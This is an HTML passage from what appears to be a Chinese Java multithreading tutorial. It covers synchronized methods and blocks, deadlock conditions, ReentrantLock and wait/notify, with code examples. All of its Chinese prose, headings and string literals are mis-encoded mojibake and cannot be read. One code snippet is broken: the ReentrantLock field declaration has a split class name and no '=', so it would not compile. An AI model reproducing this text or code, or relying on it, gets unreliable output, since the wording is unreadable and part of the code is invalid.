<li>ç”±äºåŒä¸€è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€å—å­˜å‚¨ç©ºé—´ï¼Œåœ¨å¸¦æ¥æ–¹ä¾¿çš„åŒæ—¶ï¼Œä¹Ÿå¸¦æ¥äº†è®¿é—®å†²çªé—®é¢˜ï¼Œä¸ºäº†ä¿è¯æ•°æ®åœ¨æ–¹æ³•ä¸­è¢«è®¿é—®æ—¶çš„æ­£ç¡®æ€§ï¼Œåœ¨è®¿é—®æ—¶åŠ å…¥é”æœºåˆ¶synchronizedï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è·å¾—å¯¹è±¡çš„æ’å®ƒé”ï¼Œç‹¬å èµ„æºï¼Œå…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å¾…ä½¿ç”¨åé‡Šæ”¾é”å³å¯ã€‚å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š<ul>
<li>ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”ä¼šå¯¼è‡´å…¶ä»–æ‰€æœ‰éœ€è¦æ­¤é”çš„çº¿ç¨‹æŒ‚èµ·ï¼›</li>
<li>åœ¨å¤šçº¿ç¨‹ç«äº‰ä¸‹ï¼ŒåŠ é”ï¼Œé‡Šæ”¾é”ä¼šå¯¼è‡´æ¯”è¾ƒå¤šçš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œè°ƒåº¦å»¶æ—¶ï¼Œå¼•èµ·æ€§èƒ½é—®é¢˜ï¼›</li>
<li>å¦‚æœä¸€ä¸ªä¼˜å…ˆçº§é«˜çš„çº¿ç¨‹ç­‰å¾…ä¸ªä¼˜å…ˆçº§ä½çš„çº¿ç¨‹é‡Šæ”¾é”ä¼šå¯¼è‡´ä¼˜å…ˆçº§å€’ç½®ï¼Œå¼•èµ·æ€§èƒ½é—®é¢˜ã€‚</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="2ã€åŒæ­¥æ–¹æ³•"><a href="#2ã€åŒæ­¥æ–¹æ³•" class="headerlink" title="2ã€åŒæ­¥æ–¹æ³•"></a>2ã€åŒæ­¥æ–¹æ³•</h4><ul>
<li>ç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡ privateå…³é”®å­—æ¥ä¿è¯æ•°æ®å¯¹è±¡åªèƒ½è¢«æ–¹æ³•è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é’ˆå¯¹æ–¹æ³•æå²€ä¸€å¥—æœºåˆ¶ï¼Œè¿™å¥—æœºåˆ¶å°±æ˜¯syÎ· chronizedå…³é”®å­—ï¼Œå®ƒåŒ…æ‹¬ä¸¤ç§ç”¨æ³•synchronizedæ–¹æ³•å’Œ synchronizedå—ã€‚<ul>
<li>åŒæ­¥æ–¹æ³•ï¼špublic synchronized void method (int args) {}</li>
</ul>
</li>
<li>synchronizedæ–¹æ³•æ§åˆ¶å¯¹â€œå¯¹è±¡â€çš„è®¿é—®ï¼Œæ¯ä¸ªå¯¹è±¡å¯¹åº”ä¸€æŠŠé”ï¼Œæ¯ä¸ªsynchronizedæ–¹æ³•éƒ½å¿…é¡»è·å¾—è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡çš„é”æ‰èƒ½æ‰§è¡Œï¼Œå¦åˆ™çº¿ç¨‹ä¼šé˜»å¡ï¼Œæ–¹æ³•ä¸€æ—¦æ‰§è¡Œï¼Œå°±ç‹¬å è¯¥é”ï¼Œç›´åˆ°è¯¥æ–¹æ³•è¿”å›æ‰é‡Šæ”¾é”ï¼Œåé¢è¢«é˜»å¡çš„çº¿ç¨‹æ‰èƒ½è·å¾—è¿™ä¸ªé”ï¼Œç»§ç»­æ‰§è¡Œã€‚<ul>
<li>ç¼ºé™·ï¼šè‹¥å°†ä¸€ä¸ªå¤§çš„æ–¹æ³•ç”³æ˜ä¸º synchronizedå°†ä¼šå½±å“æ•ˆç‡ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BuyTicket</span> <span class="variable">buyTicket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BuyTicket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;å¼ ä¸‰&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;æå››&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket, <span class="string">&quot;ç‹äº”&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BuyTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="comment">// ç¥¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticketNums</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹°ç¥¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">buy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ticketNums &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;æ‹¿åˆ°&quot;</span> + ticketNums--);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ é”å‰ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/97851aa1659b6455ef2896b6e007843a--7088--image-20241006145802193.png" alt="image-20241006145802193"></p>
<p>åŠ é”åï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/2408cff000b434b3d05db3cbd12bdd9b--312f--image-20241006145827201.png" alt="image-20241006145827201"></p>
<h4 id="3-åŒæ­¥å—"><a href="#3-åŒæ­¥å—" class="headerlink" title="3.åŒæ­¥å—"></a>3.åŒæ­¥å—</h4><ul>
<li>åŒæ­¥å—ï¼šsynchronized (Obj) {}</li>
<li>objç§°ä¹‹ä¸ºåŒæ­¥ç›‘è§†å™¨<ul>
<li>Objå¯ä»¥æ˜¯ä»»ä½•å¯¹è±¡ï¼Œä½†æ˜¯æ¨å­˜ä½¿ç”¨å…±äº«èµ„æºä½œä¸ºåŒæ­¥ç›‘è§†å™¨ã€‚</li>
<li>åŒæ­¥æ–¹æ³•ä¸­æ— éœ€æŒ‡å®šåŒæ­¥ç›‘è§†å™¨ï¼Œå› ä¸ºåŒæ­¥æ–¹æ³•çš„åŒæ­¥ç›‘è§†å™¨å°±æ˜¯thisï¼Œå°±æ˜¯è¿™ä¸ªå¯¹è±¡æœ¬èº«ï¼Œæˆ–è€…æ˜¯classã€‚</li>
</ul>
</li>
<li>åŒæ­¥ç›‘è§†å™¨çš„æ‰§è¡Œè¿‡ç¨‹ï¼š<ul>
<li>1.ç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—®ï¼Œé”å®šåŒæ­¥ç›‘è§†å™¨ï¼Œæ‰§è¡Œå…¶ä¸­ä»£ç ï¼›</li>
<li>2.ç¬¬äºŒä¸ªçº¿ç¨‹è®¿é—®ï¼Œå‘ç°åŒæ­¥ç›‘è§†å™¨è¢«é”å®šï¼Œæ— æ³•è®¿é—®ï¼›</li>
<li>3.ç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—®å®Œæ¯•ï¼Œè§£é”åŒæ­¥ç›‘è§†å™¨ï¼›</li>
<li>4.ç¬¬äºŒä¸ªçº¿ç¨‹è®¿é—®ï¼Œå‘ç°åŒæ­¥ç›‘è§†å™¨æ²¡æœ‰é”ï¼Œç„¶åé”å®šå¹¶è®¿é—®ã€‚</li>
</ul>
</li>
</ul>
<p><strong>é”çš„å¯¹è±¡å°±æ˜¯å˜é‡çš„é‡,éœ€è¦å¢åˆ æ”¹æŸ¥çš„å¯¹è±¡</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">100</span>, <span class="string">&quot;å…»è€åŸºé‡‘&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">drawing</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">60</span>, <span class="string">&quot;å¤¸å…‹&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">drawing2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">100</span>, <span class="string">&quot;1111&quot;</span>);</span><br><span class="line">        <span class="type">Drawing</span> <span class="variable">same</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Drawing</span>(account, <span class="number">120</span>, <span class="string">&quot;same&quot;</span>);</span><br><span class="line">        drawing.start();</span><br><span class="line">        drawing2.start();</span><br><span class="line">        same.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>&#123;</span><br><span class="line">    <span class="type">int</span> money;  <span class="comment">// ä½™é¢</span></span><br><span class="line">    String cardName;    <span class="comment">// å¡å</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> money, String cardName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.money = money;</span><br><span class="line">        <span class="built_in">this</span>.cardName = cardName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Drawing</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    Account account;    <span class="comment">// è´¦æˆ·</span></span><br><span class="line">    <span class="type">int</span> drawingMoney;   <span class="comment">// å–ä½™é¢</span></span><br><span class="line">    <span class="type">int</span> nowMoney;   <span class="comment">// ä¸ªäººæ‰‹é‡Œçš„é’±</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Drawing</span><span class="params">(Account account, <span class="type">int</span> drawingMoney, String name)</span> &#123;</span><br><span class="line">        <span class="comment">// super(name) =  çˆ¶ç±»æ„é€ æ–¹æ³•(name)</span></span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        <span class="built_in">this</span>.account = account;</span><br><span class="line">        <span class="built_in">this</span>.drawingMoney = drawingMoney;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å–é’±</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// é”çš„å¯¹è±¡å°±æ˜¯å˜é‡çš„é‡,éœ€è¦å¢åˆ æ”¹æŸ¥çš„å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">synchronized</span> (account) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰é’±</span></span><br><span class="line">            <span class="keyword">if</span> (account.money - drawingMoney &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;ä½™é¢ä¸è¶³,ä¸èƒ½è¿›è¡Œå–é’±&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>); <span class="comment">// æ”¾å¤§é—®é¢˜çš„å‘ç”Ÿæ€§</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å¡å†…é‡‘é¢ = ä½™é¢ - ä¸ªäººæ‰‹é‡Œçš„é’±</span></span><br><span class="line">            account.money = account.money - drawingMoney;</span><br><span class="line">            <span class="comment">// ä¸ªäººæ‰‹é‡Œçš„é’±</span></span><br><span class="line">            nowMoney = nowMoney + drawingMoney;</span><br><span class="line">            System.out.println(account.cardName + <span class="string">&quot;ä½™é¢ä¸º:&quot;</span> + account.money);</span><br><span class="line">            <span class="comment">// this.getName()==Thread.currentThread().getName()</span></span><br><span class="line">            System.out.println(<span class="built_in">this</span>.getName() + <span class="string">&quot;æ‰‹é‡Œçš„é’±:&quot;</span> + nowMoney);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-æ­»é”"><a href="#4-æ­»é”" class="headerlink" title="4.æ­»é”"></a>4.æ­»é”</h4><ul>
<li>å¤šä¸ªçº¿ç¨‹å„è‡ªå æœ‰ä¸€äº›å…±äº«èµ„æºï¼Œå¹¶ä¸”äº’ç›¸ç­‰å¾…å…¶ä»–çº¿ç¨‹å æœ‰çš„èµ„æºæ‰èƒ½è¿è¡Œï¼Œè€Œå¯¼è‡´ä¸¤ä¸ªæˆ–è€…å¤šä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹é‡Šæ”¾èµ„æºï¼Œéƒ½åœæ­¢æ‰§è¡Œçš„æƒ…å½¢ã€‚æŸä¸€ä¸ªåŒæ­¥å—åŒæ—¶æ‹¥æœ‰â€œä¸¤ä¸ªä»¥ä¸Šå¯¹è±¡çš„é”â€æ—¶ï¼Œå°±å¯èƒ½ä¼šå‘ç”Ÿâ€œæ­»é”â€çš„é—®é¢˜ã€‚</li>
</ul>
<blockquote>
<p>æ­»é”:å¤šä¸ªçº¿ç¨‹äº’ç›¸æŠ±ç€å¯¹æ–¹éœ€è¦çš„èµ„æº,ç„¶åå½¢æˆåƒµæŒ</p>
<p>è§£å†³:ä¸€ä¸ªé”åªé”ä¸€ä¸ªå¯¹è±¡</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Makeup</span> <span class="variable">makeup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">0</span>, <span class="string">&quot;é»„ç„–é¸¡&quot;</span>);</span><br><span class="line">        <span class="type">Makeup</span> <span class="variable">makeup1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Makeup</span>(<span class="number">1</span>, <span class="string">&quot;ç‰›è‚‰åœŸè±†ç²‰&quot;</span>);</span><br><span class="line"></span><br><span class="line">        makeup.start();</span><br><span class="line">        makeup1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é¸­è„–</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DuckNeck</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœŸè±†ç²‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PotatoPowder</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Makeup</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="comment">// éœ€è¦çš„èµ„æºåªæœ‰ä¸€ä»½,ç”¨staticä¿è¯åªæœ‰ä¸€ä»½</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">DuckNeck</span> <span class="variable">duckneck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DuckNeck</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="type">PotatoPowder</span> <span class="variable">potatoPowder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PotatoPowder</span>();</span><br><span class="line">    <span class="type">int</span> choice; <span class="comment">// é€‰æ‹©</span></span><br><span class="line">    String foodName;    <span class="comment">// é£Ÿå“åç§°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Makeup</span><span class="params">(<span class="type">int</span> choice, String foodName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.choice = choice;</span><br><span class="line">        <span class="built_in">this</span>.foodName = foodName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ç¾é£Ÿ</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            food();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">food</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (duckneck) &#123;    <span class="comment">// è·å¾—é¸­è„–çš„é”</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;è·å¾—é¸­è„–çš„é”&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">synchronized</span> (potatoPowder)&#123;    <span class="comment">// ä¸€ç§’åæƒ³è·å¾— åœŸè±†ç²‰çš„é”</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;è·å¾—åœŸè±†ç²‰çš„é”&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (duckneck) &#123;    <span class="comment">// è·å¾—é¸­è„–çš„é”</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;è·å¾—é¸­è„–çš„é”&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">synchronized</span> (potatoPowder)&#123;    <span class="comment">// ä¸€ç§’åæƒ³è·å¾— åœŸè±†ç²‰çš„é”</span></span><br><span class="line">                System.out.println(<span class="built_in">this</span>.foodName + <span class="string">&quot;è·å¾—åœŸè±†ç²‰çš„é”&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é¿å…æ­»é”çš„åŠæ³•</p>
</blockquote>
<ul>
<li>äº§ç”Ÿæ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶<ul>
<li>1.äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºæ¯æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ã€‚</li>
<li>2.è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ã€‚</li>
<li>3.ä¸å‰¥å¤ºæ¡ä»¶âˆ¶è¿›ç¨‹å·²è·å¾—çš„èµ„æºï¼Œåœ¨æœ«ä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½å¼ºè¡Œå‰¥å¤ºã€‚</li>
<li>4.å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²è¿›ç¨‹ä¹‹é—´å½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„å¾ªç¯ç­‰å¾…èµ„æºå…³ç³»ã€‚</li>
</ul>
</li>
<li>ä¸Šé¢åˆ—å‡ºäº†æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶ï¼Œæˆ‘ä»¬åªè¦æƒ³åŠæ³•ç ´å…¶ä¸­çš„ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶å°±å¯ä»¥é¿å…æ­»é”å‘ç”Ÿã€‚</li>
</ul>
<h4 id="5ã€Lockï¼ˆé”ï¼‰"><a href="#5ã€Lockï¼ˆé”ï¼‰" class="headerlink" title="5ã€Lockï¼ˆé”ï¼‰"></a>5ã€Lockï¼ˆé”ï¼‰</h4><ul>
<li>ä»JDK 5.0å¼€å§‹, Javaæä¾›äº†æ›´å¼ºå¤§çš„çº¿ç¨‹åŒæ­¥æœºåˆ¶ä¸€é€šè¿‡æ˜¾å¼å®šä¹‰åŒæ­¥é”å¯¹è±¡æ¥å®ç°åŒæ­¥ã€‚åŒæ­¥é”ä½¿ç”¨Lockå¯¹è±¡å……å½“ã€‚</li>
<li>java.util.concurrent.locks.Lockæ¥å£æ˜¯æ§åˆ¶å¤šä¸ªçº¿ç¨‹å¯¹å…±äº«èµ„æºè¿›è¡Œè®¿é—®çš„å·¥å…·ã€‚é”æä¾›äº†å¯¹å…±äº«èµ„æºçš„ç‹¬å è®¿é—®ï¼Œæ¯æ¬¡åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹å¯¹Lockå¯¹è±¡åŠ é”ï¼Œçº¿ç¨‹å¼€å§‹è®¿é—®å…±äº«èµ„æºä¹‹å‰åº”å…ˆè·å¾—Lockå¯¹è±¡ã€‚</li>
<li>ReentrantLock ç±»å®ç°äº† Lockï¼Œå®ƒæ‹¥æœ‰ä¸ synchronized ç›¸åŒçš„å¹¶å‘æ€§å’Œå†…å­˜è¯­ä¹‰ï¼Œåœ¨å®ç°çº¿ç¨‹å®‰å…¨çš„æ§åˆ¶ä¸­ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ReentrantLock, å¯ä»¥æ˜¾å¼åŠ é”ã€é‡Šæ”¾é”ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Reentrantlock lock <span class="keyword">new</span> <span class="title class_">Reen</span> TrantLock();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// ä¿è¯çº¿ç¨‹å®‰å…¨çš„ä»£ç </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            lock.unlock();	<span class="comment">// å¦‚æœåŒæ­¥ä»£ç æœ‰å¼‚å¸¸ï¼Œè¦å°†unlock()å†™å…¥finallyè¯­å¥å—</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="6-synchroizedä¸Lockå¯¹æ¯”"><a href="#6-synchroizedä¸Lockå¯¹æ¯”" class="headerlink" title="6.synchroizedä¸Lockå¯¹æ¯”"></a>6.synchroizedä¸Lockå¯¹æ¯”</h4><ul>
<li>Lockæ˜¯æ˜¾å¼é” (æ‰‹åŠ¨å¼€å¯å’Œå…³é—­é”ï¼Œåˆ«å¿˜è®°å…³é—­é”) synchronizedæ˜¯éšå¼é”, å‡ºäº†ä½œç”¨åŸŸè‡ªåŠ¨é‡Šæ”¾ã€‚</li>
<li>Lockåªæœ‰ä»£ç å—é”, synchronizedæœ‰ä»£ç å—é”å’Œæ–¹æ³•é”ã€‚</li>
<li>ä½¿ç”¨Locké”ï¼ŒJVMå°†èŠ±è´¹è¾ƒå°‘çš„æ—¶é—´æ¥è°ƒåº¦çº¿ç¨‹, æ€§èƒ½æ›´å¥½ã€‚å¹¶ä¸”å…·æœ‰æ›´å¥½çš„æ‰©å±•æ€§ (æä¾›æ›´å¤šçš„å­ç±»)ã€‚</li>
<li>ä¼˜å…ˆä½¿ç”¨é¡ºåº:<ul>
<li>Lock &gt; åŒæ­¥ä»£ç å— (å·²ç»è¿›å…¥äº†æ–¹æ³•ä½“ï¼Œåˆ†é…äº†ç›¸åº”èµ„æº $)&gt;$ åŒæ­¥æ–¹æ³• (åœ¨æ–¹æ³•ä½“ä¹‹å¤–)</li>
</ul>
</li>
</ul>
<h3 id="4-çº¿ç¨‹é€šä¿¡é—®é¢˜"><a href="#4-çº¿ç¨‹é€šä¿¡é—®é¢˜" class="headerlink" title="4.çº¿ç¨‹é€šä¿¡é—®é¢˜"></a>4.çº¿ç¨‹é€šä¿¡é—®é¢˜</h3><ul>
<li>åº”ç”¨åœºæ™¯ : ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…é—®é¢˜<ul>
<li>å‡è®¾ä»“åº“ä¸­åªèƒ½å­˜æ”¾ä¸€ä»¶äº§å“ , ç”Ÿäº§è€…å°†ç”Ÿäº§å‡ºæ¥çš„äº§å“æ”¾å…¥ä»“åº“ï¼Œæ¶ˆè´¹è€…å°†ä»“åº“ä¸­äº§å“å–èµ°æ¶ˆè´¹ã€‚</li>
<li>å¦‚æœä»“åº“ä¸­æ²¡æœ‰äº§å“ , åˆ™ç”Ÿäº§è€…å°†äº§å“æ”¾å…¥ä»“åº“ï¼Œå¦åˆ™åœæ­¢ç”Ÿäº§å¹¶ç­‰å¾…ï¼Œç›´åˆ°ä»“åº“ä¸­çš„äº§å“è¢«æ¶ˆè´¹è€…å–èµ°ä¸ºæ­¢ã€‚</li>
<li>å¦‚æœä»“åº“ä¸­æ”¾æœ‰äº§å“ , åˆ™æ¶ˆè´¹è€…å¯ä»¥å°†äº§å“å–èµ°æ¶ˆè´¹ï¼Œå¦åˆ™åœæ­¢æ¶ˆè´¹å¹¶ç­‰å¾…ï¼Œç›´åˆ°ä»“åº“ä¸­å†æ¬¡æ”¾å…¥äº§å“ä¸ºæ­¢ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/76a92767801a37f6cc81d492e28bb998--6b68--image-20241006152941896.png" alt="image-20241006152941896"></p>
<h4 id="1-çº¿ç¨‹é€šä¿¡æ–¹æ³•"><a href="#1-çº¿ç¨‹é€šä¿¡æ–¹æ³•" class="headerlink" title="1.çº¿ç¨‹é€šä¿¡æ–¹æ³•"></a>1.çº¿ç¨‹é€šä¿¡æ–¹æ³•</h4><ul>
<li>Javaæä¾›äº†å‡ ä¸ªæ–¹æ³•è§£å†³çº¿ç¨‹ä¹‹é—´çš„é€šä¿¡é—®é¢˜ã€‚</li>
</ul>
<table>
<thead>
<tr>
<th align="center">æ–¹æ³•å</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">wait()</td>
<td>è¡¨ç¤ºçº¿ç¨‹ä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°å…¶ä»–çº¿ç¨‹é€šçŸ¥ï¼Œä¸sleepä¸åŒä¼šé‡Šæ”¾é”ã€‚</td>
</tr>
<tr>
<td align="center">wait(long timeout)</td>
<td>æŒ‡å®šç­‰å¾…çš„æ¯«ç§’æ•°ã€‚</td>
</tr>
<tr>
<td align="center">notify()</td>
<td>å”¤é†’ä¸€ä¸ªå¤„äºç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ã€‚</td>
</tr>
<tr>
<td align="center">notifyAll()</td>
<td>å”¤é†’åŒä¸€ä¸ªå¯¹è±¡ä¸Šæ‰€æœ‰è°ƒç”¨wait()æ–¹æ³•çš„çº¿ç¨‹ï¼Œä¼˜å…ˆçº§åˆ«é«˜çš„çº¿ç¨‹ä¼˜å…ˆè°ƒåº¦ã€‚</td>
</tr>
</tbody></table>
<ul>
